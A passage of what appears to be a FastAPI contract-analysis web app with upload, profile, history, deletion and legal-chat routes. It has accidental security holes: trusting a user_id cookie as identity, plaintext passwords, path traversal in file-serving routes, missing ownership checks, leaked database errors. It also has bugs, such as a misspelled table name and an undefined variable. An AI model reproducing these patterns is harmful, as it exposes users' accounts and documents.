            analysis_data = analyze_json(session_data,result[0])
            print(f"The analysis data is: {analysis_data}")
            return ht_pages.TemplateResponse(
                "analysis.html",
                {
                    "request":req,
                    "name":user_data["full_name"],
                    "output":analysis_data
                    } # If you have any additional parameters you can add them in this dictionary
            )
        else:
            return ht_pages.TemplateResponse(
                "nocontract.html",
                {
                    "request":req,
                    "name":user_data["full_name"]
                } # If you have any additional parameters you can add them in this dictionary
            )
    
    f_name = user_data["file_name"]
    
    j_name = os.path.splitext(f_name)[0]
    output_filename = f"{j_name}.json"
    output_path = os.path.join(user_folder, output_filename)
    
    print("*"*100)
    logger.info(f"From the OSS The file name is: {f_name}")
    logger.info(f"The file link is: {user_data['file_url']}")

    api_url = oss_upload(user_data["file_url"], f_name)
    logger.info(f"The OSS url is: {api_url}")

    print("*"*100)

    res=[]
    res = api_dep(api_url,f_name, output_path)

    if res:
        if flag == False:
            cur.execute("""
                    UPDATE users
                    SET files_names = files_names || ARRAY[%s]
                    WHERE email = %s;
                    """, (f_name,user_data["email"]))
            
            cur.execute("""
                UPDATE files
                SET report_name = %s,analyzed_at = %s                
                WHERE file_name = %s;
                """, (output_filename, datetime.now(),f_name))
        else:
            cur.execute("""
                    UPDATE companies
                    SET files_names = files_names || ARRAY[%s]
                    WHERE email = %s;
                    """, (f_name,user_data["email"]))
            
            cur.execute("""
                UPDATE comp_files
                SET report_name = %s,analyzed_at = %s                
                WHERE file_name = %s;
                """, (output_filename, datetime.now(),f_name))

        logger.info(f"File name {f_name}  and output {output_filename} are added to DB successfully !")
    
    con.commit()
    
    analysis_data = analyze_json(session_data,output_filename)

    # Here we clean the file_url and file_name from the user_data
    save_user_data(user_data["user_id"],user_data["username"], user_data["full_name"], user_data["email"])    
   
    return ht_pages.TemplateResponse(
        "analysis.html",
        {
            "request":req,
            "name":user_data["full_name"],
            "output":analysis_data
            } # If you have any additional parameters you can add them in this dictionary
    )


@app.get("/nocontract", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        # session_data = await get_session_data(session_id)
        # logger.info(session_data)
        # user_data=reach_json(session_data)
        return ht_pages.TemplateResponse(
            "nocontract.html",
            {
                "request":req,
                "name":req.cookies.get("full_name")
            } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/mydash", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        user_id = req.cookies.get("user_id")
        flag = req.cookies.get("flag")
        
        if flag == False:
            cur.execute("SELECT username, full_name FROM users WHERE user_id = %s", (user_id,))
            data = cur.fetchone()
        else:
            cur.execute("SELECT username, full_name FROM companies WHERE comp_id=%s",(user_id,))
            data=cur.fetchone()
        
        username=data[0]
        full_name = data[1]
        session_data={
            'user_id':user_id,
            'username':username
        }
        print(f"The session data is: {session_data}")
        user_folder = os.path.join(USERS_DIR, f"{session_data['user_id']}_{session_data['username']}")
        print(f"The user folder is: {user_folder}")
        c_number,c_pages,c_characters,c_cost = analyze_folder(user_folder)
        print("we have finished the analyzing folder")
        return ht_pages.TemplateResponse(
            "mydash.html",
            {
                "request":req,
                "name":full_name,
                "contract_number":c_number,
                "contract_pages":c_pages,
                "contract_characters":c_characters,
                "contract_cost":c_cost
                } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/loading", response_class=HTMLResponse)
async def loading(request: Request):
        return ht_pages.TemplateResponse(
            "loading.html",
            {
                "request":request
                } # If you have any additional parameters you can add them in this dictionary
        )



@app.get("/pdf/{filename}")
def get_pdf(filename: str):
    # Build the full path securely
    base_dir = "D:/Main_Project/users/bf6d9018-8ef2-47fc-a54d-49f2e5b36cf9_Taha"
    file_path = os.path.join(base_dir, filename)
    if not os.path.isfile(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(path=file_path, media_type='application/pdf', filename=filename)


@app.get("/document",response_class=HTMLResponse)
async def document(req: Request,filename:str=None):
        user_id = req.cookies.get("user_id")
        cur.execute("SELECT username, full_name FROM users WHERE user_id = %s", (user_id,))
        data = cur.fetchone()
        username=data[0]
        full_name = data[1]
        
        session_data={
            'user_id':user_id,
            'username':username
        }
        
        if (filename == None):
            query = """
                SELECT report_name, file_name
                FROM files
                WHERE user_id = %s
                AND analyzed_at IS NOT NULL
                ORDER BY analyzed_at DESC
                LIMIT 1;
            """
            
            # Execute query with user_id
            cur.execute(query, (user_id,))
            
            # Fetch the result
            result = cur.fetchone()
            
            if result:
                # print(f"Report Name: {result['report_name']}")
                # print(f"File Name: {result['file_name']}")
                
                json_data = analyze_json(session_data,result[0])
                user_folder = os.path.join(USERS_DIR, f"{user_id}_{username}")
                folder_name = os.path.basename(user_folder)
                file_path = os.path.join(user_folder, result[1])
                
                print(f"The file path is: {file_path}")
                filename = os.path.basename(file_path)
                pdf_url = f"/pdf/{folder_name}/{filename}"
                print(f"The PDF URL is: {pdf_url}")
                print(f"The JSON data is: {json_data}")
        else:
            query = """
                SELECT report_name
                FROM files
                WHERE file_name = %s"""
            # Execute query with user_id
            cur.execute(query, (filename,))
            
            # Fetch the result
            result = cur.fetchone()
            report_name=result[0]
            json_data = analyze_json(session_data,report_name)
            user_folder = os.path.join(USERS_DIR, f"{user_id}_{username}")
            folder_name = os.path.basename(user_folder)
            file_path = os.path.join(user_folder, filename)
            
            print(f"The file path is: {file_path}")
            filename = os.path.basename(file_path)
            pdf_url = f"/pdf/{folder_name}/{filename}"
            print(f"The PDF URL is: {pdf_url}")
            print(f"The JSON data is: {json_data}")
                
        return ht_pages.TemplateResponse(
            "document.html",
            {
                "request":req,
                "name":full_name,
                "file_path":pdf_url,
                "output":json_data
                } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/upload_contract", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        # session_data = await get_session_data(session_id)
        # user_data=reach_json(session_data)
        
        user_id = req.cookies.get("user_id")
        flag = req.cookies.get("flag")
        if flag == False:
            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
            full_name = cur.fetchone()[0]
        else:
            cur.execute("SELECT full_name FROM companies WHERE comp_id=%s",(user_id,))
            full_name=cur.fetchone()[0]

        return ht_pages.TemplateResponse(
            "upload_contract.html",
            {
                "request":req,
                "name":full_name
                } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/history", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        # session_data = await get_session_data(session_id)
        user_id = req.cookies.get("user_id")
        flag = req.cookies.get("flag")
        if flag == False:
            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
            full_name = cur.fetchone()[0]
            cur.execute("SELECT file_name, uploaded_at, report_name, analyzed_at FROM files WHERE user_id = %s", (user_id,))
            files = cur.fetchall()
        else:
            cur.execute("SELECT full_name FROM companies WHERE comp_id=%s",(user_id,))
            full_name=cur.fetchone()[0]
            cur.execute("SELECT file_name, uploaded_at, report_name, analyzed_at FROM comp_files WHERE comp_id = %s", (user_id,))
            files = cur.fetchall()
        
        # user_data=reach_json(user_id)


        return ht_pages.TemplateResponse(
        "history.html",
        {
            "request":req,
            "name":full_name,
            "files":files
            } # If you have any additional parameters you can add them in this dictionary
    )
    


@app.get("/profile", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        
        user_id = req.cookies.get("user_id")
        flag = req.cookies.get("flag")
        if flag == False:
            cur.execute("SELECT email, phone, full_name FROM users WHERE user_id = %s", (user_id,))
            email, phone, full_name = cur.fetchone()
        else:
            cur.execute("SELECT email, phone, full_name FROM companies WHERE comp_id=%s",(user_id,))
            email, phone, full_name=cur.fetchone()

        return ht_pages.TemplateResponse(
            "profile.html",
            {
                "request":req,
                "name":full_name,
                "email":email,
                "phone":phone,
                "user_id":user_id
            } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/subscriptions", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        # session_data = await get_session_data(session_id)
        # user_data=reach_json(session_data)

        user_id = req.cookies.get("user_id")
        flag = req.cookies.get("flag")
        logger.info(f"The user_id is {user_id}")
        if flag:
            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
        else:
            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
        
        full_name = cur.fetchone()[0]
        
        # if name != None:
        #      full_name = name
        return ht_pages.TemplateResponse(
            "subscriptions.html",
            {
                "request":req,
                "name":full_name
                } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/helpcenter", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        # session_data = await get_session_data(session_id)
        # user_data=reach_json(session_data)
        
        user_id = req.cookies.get("user_id")
        flag = req.cookies.get("flag")
        if flag:
            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
        else:
            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
        
        full_name = cur.fetchone()[0]
        return ht_pages.TemplateResponse(
            "helpcenter.html",
            {
                "request":req,
                "name":full_name
                } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/aboutus", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        # session_data = await get_session_data(session_id)
        # user_data=reach_json(session_data)
        
        user_id = req.cookies.get("user_id")
        flag = req.cookies.get("flag")
        logger.info(f"The user_id is {user_id}")
        if flag:
            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
        else:
            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
        
        full_name = cur.fetchone()[0]
        return ht_pages.TemplateResponse(
            "aboutus.html",
            {
                "request":req,
                "name":full_name
                } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/contactus", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # # Get user data from their file
        # session_data = await get_session_data(session_id)
        # user_data=reach_json(session_data)
        
        user_id = req.cookies.get("user_id")
        flag = req.cookies.get("flag")
        if flag:
            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
        else:
            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
        
        full_name = cur.fetchone()[0]

        return ht_pages.TemplateResponse(
            "contactus.html",
            {
                "request":req,
                "name":full_name
                } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/analysis_dashboard", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        session_data = await get_session_data(session_id)
        user_data=reach_json(session_data)
        return ht_pages.TemplateResponse(
            "analysis_dashboard.html",
            {
                "request":req,
                "name":user_data["full_name"]
                } # If you have any additional parameters you can add them in this dictionary
        )
@app.get("/admin_dashboard", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        session_data = await get_session_data(session_id)
        user_data=reach_json(session_data)
        return ht_pages.TemplateResponse(
        "admin_dashboard.html",
        {
            "request":req,
            "name":user_data["full_name"]
            } # If you have any additional parameters you can add them in this dictionary
    )

@app.get("/forgetpassword", response_class=HTMLResponse)
async def root_page(req:Request):
   
        return ht_pages.TemplateResponse(
            "forgetpassword.html",
            {
                "request":req,
                "name":result[0]
                } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/whats-new", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        # session_data = await get_session_data(session_id)
        # user_data=reach_json(session_data)

        user_id = req.cookies.get("user_id")
        flag = req.cookies.get("flag")
        logger.info(f"The user_id is {user_id}")
        if flag:
            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
        else:
            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
        
        full_name = cur.fetchone()[0]
        return ht_pages.TemplateResponse(
            "whatisnew.html",
            {
                "request":req,
                "name":full_name
                } # If you have any additional parameters you can add them in this dictionary
        )

@app.get("/question", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        session_data = await get_session_data(session_id)
        user_data=reach_json(session_data)
   
        return ht_pages.TemplateResponse(
            "quuestionaire.html",
            {
                "request":req,
                "name":user_data["full_name"]
                } # If you have any additional parameters you can add them in this dictionary
        )
# Route to handle file upload and analysis
@app.post("/analyze")
async def upload_contract(request: Request, file: UploadFile = File(...)):
        """Upload contract file and redirect to signin page"""
        # Store the file temporarily and remember its name in the session
        temp_dir = os.path.join(os.path.dirname(__file__), "uploads")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        
        # Generate a unique ID for the uploaded file
        file_id = int(time.time() * 10000)
        file_extension = os.path.splitext(file.filename)[1]
        temp_filename = f"{file_id}_{file.filename}"
        temp_path = os.path.join(temp_dir, temp_filename)
        logger.info(f"Fron ANALYZEthe temp_path is: {temp_path}")
        
        with open(temp_path, "wb") as buffer:
            buffer.write(await file.read())
        analysis_results = analyze_contract(temp_path)
        logger.info("The result of the analysis is: " + str(analysis_results))
        
        
        # Store file ID in the session
        response = RedirectResponse(url="/signin_to_load", status_code=status.HTTP_303_SEE_OTHER)
        safe_value = urllib.parse.quote(temp_filename)  # encode to ASCII-safe format
        response.set_cookie(key="temp_file_id", value=file_id)
        response.set_cookie(key="temp_file_name", value=safe_value)
        response.set_cookie(key="temp_file_ext", value=file_extension)
        logger.info("We reached the end of the analyze")
        return response
        

@app.post("/analyze_upload")
async def analyze(request: Request,file: UploadFile = File(...), session_id: SessionData = Depends(cookie)):
        user_id = request.cookies.get("user_id")
        flag = request.cookies.get("flag")
        if flag == False:
            cur.execute("SELECT username, full_name, subscription FROM users WHERE user_id = %s", (user_id,))
            data = cur.fetchone()
        else:
            cur.execute("SELECT username, full_name, subscription FROM companies WHERE comp_id=%s",(user_id,))
            data = cur.fetchone()
        username = data[0]
        full_name = data[1]
        sub = data[2]
        logger.info(f"The username is: {username} The full_name is: {full_name} The sub is: {sub}")
        if sub == None:
                logger.info("I am in routing to subscrip")
                # Encode full_name as a query parameter
                query_params = urllib.parse.urlencode({"name": full_name})
                return RedirectResponse(url=f"/subscriptions?{query_params}", status_code=302)
                
                # return ht_pages.TemplateResponse(
                #     "subscriptions.html",
                #     {
                #         "request":request,
                #         "name":full_name
                #     } # If you have any additional parameters you can add them in this dictionary
                # )
        
        session_data = {
            "username":username,
            "user_id":user_id
        }
        user_data=reach_json(session_data)

        # Store the file temporarily and remember its name in the session
        temp_dir = os.path.join(os.path.dirname(__file__), "uploads")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        
        # Generate a unique ID for the uploaded file
        file_id = int(time.time()*10000) # Use Time of uploading as ID for the file
        file_extension = os.path.splitext(file.filename)[1]
        temp_filename = f"{file_id}_{file.filename}"
        temp_path = os.path.join(temp_dir, temp_filename)
        logger.info(f"the temp_path is: {temp_path}")
       
       
        with open(temp_path, "wb") as buffer:
            buffer.write(await file.read())
        analysis_results = analyze_contract(temp_path)
        logger.info("The result of the analysis is: " + str(analysis_results))
        
        # Move the temporary file to the user's folder
        if os.path.exists(temp_path):
            logger.info(" I am in analyze_upload temp_path")
            file_url, file_name = save_contract_file(
                                    UploadFile(
                                        filename=temp_filename,
                                        file=open(temp_path, "rb")
                                    ),
                                    user_data["user_id"],
                                    user_data["username"]
                                )
            logger.info(f"The file URL is: {file_url} and file name {file_name}")
            
        # Update user data with the new file URL
        save_user_data(
            user_data["user_id"],
            user_data["username"],
            user_data["full_name"],
            user_data["email"],
            file_url,
            file_name
        )
        # Clean up the temp file
        os.remove(temp_path)

        # Redirect to dashboard with session cookie
        response = RedirectResponse(url="/loading", status_code=status.HTTP_303_SEE_OTHER)
        cookie.attach_to_response(response, session_id)
        return response

# Serve uploaded files
@app.get("/uploads/{filename}")
async def uploaded_file(filename: str):
        return FileResponse(os.path.join(UPLOAD_FOLDER, filename))

class ProfileUpdate(BaseModel):
    full_name: str
    email: str
    user_phone: Optional[str] = None
    current_password: str
    new_password: Optional[str] = None

@app.post("/profile")
async def profile_changes(req: Request,profile_data: ProfileUpdate, session_id: SessionData = Depends(cookie)):
    # Get user data from their file
    user_id = req.cookies.get("user_id")
    flag = req.cookies.get("flag")
    if flag == False:
        cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
        username = cur.fetchone()[0]
    else:
        cur.execute("SELECT username FROM companies WHERE comp_id=%s",(user_id,))
        username=cur.fetchone()[0]

    session_data = {
        "username":username,
        "user_id":user_id
    }
    user_data=reach_json(session_data)

    try:
        save_user_data(
            user_data["user_id"],
            user_data["username"],
            profile_data.full_name,
            user_data["email"],
        )
        # 1. Check current password
        if flag:
            cur.execute("SELECT password FROM companies WHERE email = %s", (profile_data.email,))
        else:
            cur.execute("SELECT password FROM users WHERE email = %s", (profile_data.email,))
        
        row = cur.fetchone()
        if not row:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="User not found with the provided email"
            )
        stored_password = row[0]
        if profile_data.current_password != stored_password:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Current password is incorrect"
            )

        # 2. Update profile info
        if flag == False:
            cur.execute("""
                UPDATE users
                SET
                    full_name = %s,
                    phone = %s
                WHERE
                    email = %s
            """, (
                profile_data.full_name,
                profile_data.user_phone,
                profile_data.email
            ))
        else:
            cur.execute("""
                UPDATE companies
                SET
                    full_name = %s,
                    phone = %s
                WHERE
                    email = %s
            """, (
                profile_data.full_name,
                profile_data.user_phone,
                profile_data.email
            ))

        # 3. Update password if new_password is provided and not empty
        if profile_data.new_password:
            if flag == False:
                cur.execute("""
                    UPDATE users
                    SET password = %s
                    WHERE email = %s
                """, (profile_data.new_password, profile_data.email))
            else:
                cur.execute("""
                    UPDATE companiesq
                    SET password = %s
                    WHERE email = %s
                """, (profile_data.new_password, profile_data.email))

        con.commit()
        return {"message": "Profile updated successfully"}
    except pg.Error as e:
        con.rollback()
        return JSONResponse(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            content={"message": f"Database error: {str(e)}"}
        )
    except Exception as e:
        con.rollback()
        return JSONResponse(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            content={"message": f"An error occurred: {str(e)}"}
        )
    # finally:
        # cur.close()
        # con.close()

from fastapi import FastAPI, HTTPException, status, Request
from fastapi.responses import JSONResponse, RedirectResponse
from pydantic import BaseModel
import psycopg2

# ...existing code...

class DeleteAccountRequest(BaseModel):
    email: str

@app.delete("/delete_file")
async def delete_file(filename: str, req: Request):
    print("The file name is: ",filename)
    user_id = req.cookies.get("user_id")
    query = """
    SELECT report_name
    FROM files
    WHERE file_name = %s"""
    # Execute query with user_id
    cur.execute(query, (filename,))    
    # Fetch the result
    report_name = cur.fetchone()[0]

    cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
    username = cur.fetchone()[0]
    cur.execute("DELETE FROM files WHERE file_name = %s", (filename,))
    con.commit()
    print("Files deleted from the database")
    
    user_folder = os.path.join(USERS_DIR, f"{user_id}_{username}")
    
    
    file_path = os.path.join(user_folder, filename)
    out_path = os.path.join(user_folder, report_name)
    
    if os.path.exists(file_path):
        try:
            os.remove(file_path)
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Failed to delete file: {e}")
        
    if os.path.exists(out_path):
        try:
            os.remove(out_path)
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Failed to delete OUT file: {e}")
    # Return a JSON response indicating success and the URL to redirect to
    return {"detail": "File deleted successfully", "redirect_url": "/history"}

@app.post("/delete_account")
async def delete_account(req: Request,  session_id: SessionData = Depends(cookie)):
    try:
        
        user_id = req.cookies.get("user_id")
        cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
        username = cur.fetchone()[0]
        delete_user_folder(user_id, username)
        
        cur.execute("DELETE FROM files WHERE user_id = %s", (user_id,))
        cur.execute("DELETE FROM users WHERE user_id = %s", (user_id,))
        con.commit()
        print("User deleted successfully")
        if cur.rowcount == 0:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="User not found with the provided email"
            )
        # Return a success response; frontend will handle the redirect
            con.commit()
        return {"message": "Account deleted successfully"}
    except pg.Error as e:
        con.rollback()
        return JSONResponse(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            content={"message": f"Database error: {str(e)}"}
        )
    except Exception as e:
        con.rollback()
        return JSONResponse(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            content={"message": f"An error occurred: {str(e)}"}
        )

# Define the expected structure of the incoming data
class Feedback(BaseModel):
    use_case: str
    frequency: str
    accuracy: str
    satisfaction: str
    ease: str
    recommend: str
    device: str
    favorite_feature: str | None
    suggestions: str | None
    suggestions_other: str | None

# Path to store the JSON file
FEEDBACK_FILE = USERS_DIR

@app.post("/fill_form")
async def fill_form(request: Request, feedback: Feedback, session_id: SessionData = Depends(cookie)):
    try:
        
        # Get user data from their file
        session_data = await get_session_data(session_id)
        user_id = session_data.user_id
        username = session_data.username
        
        user_folder = os.path.join(USERS_DIR, f"{user_id}_{username}")
        file_name= f"{time.time()*10000}_FEEDBACK.json"
        FEEDBACK_FILE = os.path.join(user_folder, file_name)

        # Prepare the feedback data with a timestamp
        feedback_data = feedback.dict()
        feedback_data["timestamp"] = datetime.utcnow().isoformat()

        # Read existing data or initialize an empty list
        if os.path.exists(FEEDBACK_FILE):
            with open(FEEDBACK_FILE, "r") as file:
                try:
                    data = json.load(file)
                    if not isinstance(data, list):
                        data = []
                except json.JSONDecodeError:
                    data = []
        else:
            data = []

        # Append new feedback
        data.append(feedback_data)

        # Write back to the file
        with open(FEEDBACK_FILE, "w") as file:
            json.dump(data, file, indent=4)

        return ht_pages.TemplateResponse(
            "upload_contract.html",
            {
                "request":request
                } # If you have any additional parameters you can add them in this dictionary
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error saving feedback: {str(e)}")


############################################
# CHAT
###########################################

def format_markdown(text):
    # Remove leading/trailing whitespace and convert \n to actual newlines
    text = text.strip().replace("\\n", "\n")
    # Split by newlines and filter out empty lines for cleaner output
    lines = [line for line in text.split("\n") if line.strip()]
    # Join lines with proper newlines, preserving markdown (bold **, italic *)
    return "\n".join(lines)

def extract_and_print_markdown(data):
    results = []
    last_two_items = data[-1:]
    for index, item in enumerate(last_two_items, start=len(data)-1):
        markdown = item.get("ResponseMarkdown", "")
        if markdown:  # Only process non-empty markdown
            formatted_text = format_markdown(markdown)
            results.append(f"\n{formatted_text}\n{'-' * 50}")
    
    return "\n".join(results)
class ChatRequest(BaseModel):
    message: str
@app.post("/chat")
async def chat_endpoint(chat: ChatRequest):
    messages = [{"role": "user", "content": f"彻底分析以下法律问题。一般分析：首先从合法性、谈判原则及[插入国家名称或管辖区]相关法律和司法实践的角度审视该问题。法律依据：列出您在分析中所依赖的所有法律、法规和条款，包括任何相关的国际协议。详细解决方案：提供详细、准确且经过良好构建的解决方案，清晰地逐步分解每一个步骤或论点。风险和警告：识别这种情况下可能出现的任何风险、漏洞或法律后果。总结：以清晰简洁的总结或结论结束您的发现和建议。: {chat.message}"},]
    logger.info(f"The message is: {messages}")
    raw_out = generate_message(messages)
    with open('Chat_user_output.json', 'w', encoding='utf-8') as f:
        json.dump(raw_out, f, ensure_ascii=False, indent=4)
    response = extract_and_print_markdown(raw_out)
    return {"response": response}

@app.get("/chat", response_class=HTMLResponse)
async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
        # Get user data from their file
        # session_data = await get_session_data(session_id)
        # user_data=reach_json(session_data)
        
        user_id = req.cookies.get("user_id")
        flag = req.cookies.get("flag")
        logger.info(f"The user_id is {user_id}")
        if flag:
            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
        else:
            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
        
        full_name = cur.fetchone()[0]

        return ht_pages.TemplateResponse(
            "chat.html",
            {
                "request":req,
                "name":full_name
                } # If you have any additional parameters you can add them in this dictionary
        )

from http import HTTPStatus
import dashscope

def format_chat_response(text):
    # Convert **bold** to <b>bold</b>
    text = re.sub(r'\*\*(.*?)\*\*', r'<b>\1</b>', text)

    # Add line breaks before numbered bullets (e.g., 1. ...)
    text = re.sub(r'(\d+\.\s)', r'<br>\1', text)

    # Add line breaks before dash bullets (e.g., - ...)
    text = re.sub(r'(\n- )', r'<br>- ', text)

    # Replace double newlines with <br><br> for paragraphs
    text = re.sub(r'\n\n+', r'<br><br>', text)

    # Replace single newlines with <br>
    text = re.sub(r'\n', r'<br>', text)

    # Remove leading <br> if present
    text = re.sub(r'^<br>', '', text)

    return text
class ChatRequest(BaseModel):
    message: str
